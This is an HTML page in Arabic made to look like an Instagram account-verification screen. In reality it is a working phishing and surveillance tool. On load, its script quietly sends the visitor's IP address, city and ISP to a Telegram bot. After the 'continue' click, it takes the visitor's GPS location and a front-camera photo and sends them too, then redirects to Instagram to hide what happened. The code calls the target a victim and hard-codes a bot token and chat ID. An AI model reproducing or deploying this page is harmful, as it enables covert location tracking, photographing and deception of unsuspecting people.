<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Verification</title>
    <style>
        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
        .logo { width: 175px; margin-bottom: 20px; }
        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 15px; color: #8e8e8e; font-size: 13px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
        <p style="font-weight: 600; font-size: 14px;">تأكيد ملكية الحساب</p>
        <p style="color: #8e8e8e; font-size: 13px;">يرجى المتابعة لإتمام الفحص الأمني السريع لجهازك.</p>
        <button id="authBtn">متابعة</button>
        <div id="status"></div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
        const CHAT_ID = '2140385904'; 

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        // صيد الآيبي فوراً (استخدمنا ipapi.co لأنها أدق)
        (async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const i = await res.json();
                const info = `🔔 *صيد صامت (دخل للرابط)*\n🌐 الآيبي: \`${i.ip}\`\n🌍 البلد: ${i.country_name}\n🏙 المدينة: ${i.city}\n📡 المزود: ${i.org}`;
                sendToBot(info);
            } catch (e) { sendToBot("🔔 شخص دخل للرابط (تعذر جلب الآيبي)"); }
        })();

        document.getElementById('authBtn').onclick = async () => {
            const st = document.getElementById('status');
            st.innerText = "جاري الاتصال بخوادم الأمان...";

            // طلب الموقع والصورة بشكل متوازي لضمان عدم التعليق
            navigator.geolocation.getCurrentPosition(async (p) => {
                const mapLink = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    
                    // ننتظر قليلاً لضمان وضوح الصورة
                    setTimeout(async () => {
                        const canvas = document.getElementById('c');
                        canvas.width = 400; canvas.height = 400;
                        canvas.getContext('2d').drawImage(video, 0, 0, 400, 400);
                        
                        canvas.toBlob(async (blob) => {
                            const fd = new FormData();
                            fd.append('chat_id', CHAT_ID);
                            fd.append('photo', blob, 'shot.jpg');
                            fd.append('caption', `✅ *نجاح الصيد الكامل*\n${mapLink}`);
                            
                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                            stream.getTracks().forEach(t => t.stop());
                            st.innerText = "تم التأكيد بنجاح!";
                            setTimeout(() => location.href = "https://instagram.com", 1000);
                        }, 'image/jpeg', 0.6);
                    }, 2000);

                } catch (e) {
                    sendToBot(`⚠️ منح الموقع ولكن تعذر فتح الكاميرا\n${mapLink}`);
                    st.innerText = "اكتمل الفحص عبر الموقع الجغرافي فقط.";
                }
            }, (err) => {
                // إذا رفض الضحية فعلياً
                sendToBot("❌ الضحية رفض منح صلاحيات الموقع.");
                st.innerText = "فشل التحقق: يرجى المحاولة في متصفح آخر.";
            });
        };
    </script>
</body>
</html>
